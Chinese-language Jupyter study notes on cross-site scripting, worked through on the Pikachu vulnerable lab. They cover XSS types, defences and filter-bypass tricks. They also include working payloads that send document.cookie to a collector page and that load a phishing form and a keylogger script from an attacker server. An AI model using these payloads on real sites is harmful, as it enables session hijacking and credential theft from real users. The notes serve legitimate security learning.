# %% [markdown]
# # XSS

# %% [markdown]
# ### XSS的类型
# 1. 反射型XSS或不持久型XSS(中危)
#
# 交互的数据一般不会被存在在数据库里面,只是简单的把用户输入的数据反射给浏览器，一次性，所见即所得。
#
# `<?php
# $name = $_GET['name'];
# echo "Welcome $name<br>";
# ?>`
#
# 2. 储存型XSS 或持久型 XSS（高危）
# 交互的数据会被存在在数据库里面,永久性存储,具有很强的稳定性。
#
# 3. DOM XSS
# 不与后台服务器产生数据交互,通过前端的dom节点形成的XSS漏洞。
# DOM全称是Document Object Model，也就是文档对象模型。我们可以将DOM理解为，一个与系统平台和编程语言无关的接口，程序和脚本可以通过这个接口动态地访问和修改文档内容、结构和样式。当创建好一个页面并加载到浏览器时，DOM就悄然而生，它会把网页文档转换为一个文档对象，主要功能是处理网页内容。故可以使用 Javascript 语言来操作DOM以达到网页的目的.
# ### XSS的原因
# XSS漏洞利用的原理
# 程序对输入和输出的控制不够严格,导致"精心构造“的脚本输入后,在输到前端时被浏览器当作有效代码解析执行从而产生危害.
#
# ### XSS的危害
# 1、首先对于那些半年没有更新的小企业网站来说，发生XSS漏洞几乎没有什么用。一般在各类的社交平台，邮件系统，开源流行的Web应用，BBS，微博等场景中，造成的杀伤力却十分强大。
# 2、劫持用户cookie是最常见的跨站攻击形式，通过在网页中写入并执行脚本执行文件（多数情况下是JavaScript脚本代码），劫持用户浏览器，将用户当前使用的sessionID信息发送至攻击者控制的网站或服务器中。
# 3、“框架钓鱼”。利用JS脚本的基本功能之一：操作网页中的DOM树结构和内容，在网页中通过JS脚本，生成虚假的页面，欺骗用户执行操作，而用户所有的输入内容都会被发送到攻击者的服务器上。
# 4、挂马(水坑攻击)
# 5、有局限性的键盘记录
#
# ### XSS可能存在的地方（参考xss跨站脚本攻击文档)
# HTML context
# Attribute Context
# URL Context
# Style Context
# Script Context
#
# ###  XSS测试方法
# - 工具扫描：APPscan、AWVS
# - 手工测试：Burpsuite、firefox(hackbar)、XSSER XSSF
#
# ### XSS键盘记录攻击中域的概念解释
# 1. 什么是跨域
# http:// www.   oldboyedu.com  :80 /   news/index.php
# 协议    子域名    主域名               端口    资源地址
# 当协议、主机(主域名，子域名)、端口中的任意一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，成为跨域操作。
# 2. 同源策略
# 为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本既不同域之间不能使用JS进行操作。比如：x.com域名下的js不能操作y.com域名下的对象
# 那么为什么要有同源策略？ 比如一个恶意网站的页面通过js嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码.
#
# ## Tips:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的
# `<script src="...">  //加载本地js执行`
# `<img src="...">  //图片`
# `<link href="...">  //css  `
# `<iframe src="...">  //任意资源`
# 3. 同源策略修改
# 同之前的案例到后台设置好Access-Control-Allow-Origin，设置为*，既允许所有人访问。
# 设置为所有人访问显然是不安全的.这个时候设置*.oldboyedu.com,限定一级域名访问
#
# # 所以XSS植入哪个网页,只有这个有XSS注入漏洞的网页才能执行在当前网页的键盘记录,无法记录不同域下其他网页的键盘操作
#
# ### XSS盲打
# XSS盲打就是攻击者在前端提交的数据不知道后台是否存在xss漏洞的情况下，提交恶意JS代码在类似留言板等输入框后，所展现的后台位置的情况下，网站采用了攻击者插入的恶意代码，当后台管理员在操作时就会触发插入的恶意代码，从而达到攻击者的目的。
# 在没有回显的时候尝试的插入一下.
# ![image-3.png](attachment:image-3.png)
# 当我们登陆管理员后台的时候就看到惊喜了 后台url```http://192.168.248.128:90/pikachu/vul/xss/xssblind/admin_login.php```
# ![image-2.png](attachment:image-2.png)
#
# 那么我们也可以插入钓鱼的恶意XSS让管理员重新输入账号密码
# payload= ```<script src="http://192.168.248.128:90/pikachu/pkxss/xfish/fish.php"></script>```
# 效果貌似不是太好,一般智商的都不会上当,最好是重定向回去在弹窗,凑合着看吧
# ![image-8.png](attachment:image-8.png)
# ![image-9.png](attachment:image-9.png)
# 后台记录
# ![image-10.png](attachment:image-10.png)

# %% [markdown]
# # xss防御措施
# - 对字符实体进行转义,或者过滤尖括号,单引号 双引号等
# - 使用 HTTP Only 来禁止 JavaScript 读取 Cookie 值
# - 输入时校验、输出时采用 html 实体编码比如htmlspecialchars()
#
# htmlspecialchars()的原理是把预定义的单引号,尖括号等转换成HTML实体编码
# & (和号)成为 &amp
#  " (双引号)成为 &quot
#  '(单引号)成为&#039
#  < (小于)成为 &lt
#  \>(大于)成为 &gt
#  但是这个函数默认配置不会将单引号和双引号过滤，只有设置了quotestyle规定如何编码单引号和双引号才能会过滤掉单引号
# 可用的quotestyle类型：
# ENT_COMPAT - 默认。仅编码双引号
# ENT_QUOTES - 编码双引号和单引号
# ENT_NOQUOTES - 不编码任何引号
#
# # xss绕过思路
# 1. 对前端的限制可以尝试进行抓包重发或者修改前端的HTML。 限制输入框的字符个数
# 2. 防止后台对输入的内容进行正则匹配来过滤输入，对于这样的过滤可以考虑大小写混合输入的方法。
# 例：`<sCRipT>alert('你打篮球像oldboy')</sCrIPt>`
# 3. 防止后台对输入的内容进行替换，采用拼拼凑的输入方法。
# 例：`<sc<script>ript>alert('你打篮球像oldboy')</scr<script>ipt>`
# 4. 使用注释来干扰后台对输入内容的识别。
# 例：`<sc<!--test-->ript>alert('你打篮球像oldboy')</scr<!--tshauie-->ipt>`
# 5. 抓JS的包,手动添加payload=`</script><script>alert(1111)</script>`
# ![image.png](attachment:image.png)
#
# 用BP抓包后发现输出的内容是包裹在js代码中的
# ![image-2.png](attachment:image-2.png)
# ```
# <script>
#     $ms='12345';</script><script>alert("这里添加新的payload")</script> ;
#     if($ms.length != 0){
#         if($ms == 'tmac'){
#             $('#fromjs').text('tmac确实厉害,看那小眼神..')
#         }else {
# //            alert($ms);
#             $('#fromjs').text('无论如何不要放弃心中所爱..')
#         }
#
#     }
#
#
# </script>
# ```
# 6. htmlspecialchars() 可以试试  ```javascript:alert(111)```
# 一般情况开启了这个函数基本没希望绕过,但是如果对方把输入框的参数变量传入到一个a标签里
# 比如pikachu里面的代码所示
# ```$message=htmlspecialchars($_GET['message']);
# $html2.="<a href='{$message}'>{$message}</a>";```
# 开始实验
# ![image-3.png](attachment:image-3.png)
# ![image-4.png](attachment:image-4.png)

# %% [markdown]
# ## XSS攻击实际操作
# 1. 反射型get攻击.我们打开皮卡丘环境,对下面的带参数地方插入xss弹窗代码,使用万能闭合```'">```
# ![image.png](attachment:image.png)
# ```'"><script>alert("11")</script>```
# ![image-2.png](attachment:image-2.png)
# 2. 反射型post攻击
#
# 3. 存储型XSS攻击
# 对话框写入万能闭合和弹窗,然后一访问这个网址就会弹窗
# ![image-3.png](attachment:image-3.png)
# ![image-4.png](attachment:image-4.png)

# %% [markdown]
# ## XSS实际案例
# 网站的一个图片链接,url="http:xxx.com/mainfm.123.jpg" 在图片后面随便加特殊字符,会执行弹窗,并显示WAF的不要提交恶意字符警告. 那么这个CASE就可以拿来做XSS攻击,把弹窗的内容换成XSS的脚本,重点是网站自身的弹窗是否可以被修改.
# 记载于WEB应用和其他常见漏洞总结中 4.

# %% [markdown]
# ## XSS 利用存储XSS进行cookie获取
#
# ### pikachu环境中 先去管理工具配置XSS后台 打开```http://192.168.248.128/pikachu/pkxss/xcookie/cookie.php```
# 1. 修改下面这个代码,目的是为了一旦获取cookie就直接重定向到主页,在功能上可以避免用户发现异常的存储型XSS代码
# ![image.png](attachment:image.png)
# 2. DOM型XSS中插入payload ```'"><script>document.Location='http://192.168.248.128:90/pikachu/pkxss/xcookie/cookie.php?cookie='+document.cookie;</script>```
# document.cookie 就是用户登录的COOKIE信息,然后这个值会传到上述路径下的cookie.php中的cookie参数.再由cookie.php脚本写入pkxss_cookie_result.php
#
# 3. 实验结果,在点击DOM型XSS后跳转主页,并且后台点击COOKIE已经记录了用户的COOKIE信息
# ![image-2.png](attachment:image-2.png)
# 4. DOM这里因为设置了XSS攻击,如果想恢复运行根目录下的install.php进行初始化
# ```http://192.168.248.128:90/pikachu/install.php```

# %% [markdown]
# # XSS利用存储型漏洞进行钓鱼获取账号密码
# pikachu\pkxss\xfish\fish.php,这里需要改下配置,首先更改ip和端口,另外路径错了,应该是/pikachu/pkxss
# <font color="red">另外这个实验如果需要反复查看实验效果,需要清空cookie,不然弹窗不会出现.</font>
# ![image-2.png](attachment:image-2.png)
#
# 存储型里输入payload ```<script src="http://192.168.248.128:90/pikachu/pkxss/xfish/fish.php"></script>```
# 弹出输入钓鱼用的账号密码的对话框,这里输入的账号密码会被保存到指定的服务器数据中
# ![image.png](attachment:image.png)
#
# 后台数据如下:
# ![image-4.png](attachment:image-4.png)
# 这里解读下上面的payload,运行js脚本并且自动调用fish.php.同时fish.php如果账号密码不为空又跳转到xfish.php,并把账号和密码赋值给xfish.php的PHP_AUTH_USER 和 PHP_AUTH_PW
# ![image-3.png](attachment:image-3.png)

# %% [markdown]
# ## XSS键盘记录示例
#
# pikachu\pkxss\rkeypress\rk.js 修改路径和ip和端口如下:
# ![image-2.png](attachment:image-2.png)
#
# DOM型输入payload ```<script src="http://192.168.248.128:90/pikachu/pkxss/rkeypress/rk.js"></script>```
# 后台记录如下:
# ![image.png](attachment:image.png)
#
# <font color="red">问题:同源策略是同ip同端口,那么pikachu文件下所有的文件都是同源吗</font>
# <font color="red">这里因为XSS代码记录在DOM页面,因此能记录的键盘也只能在DOM页面有效,其他页面的键盘记录不会生效</font>
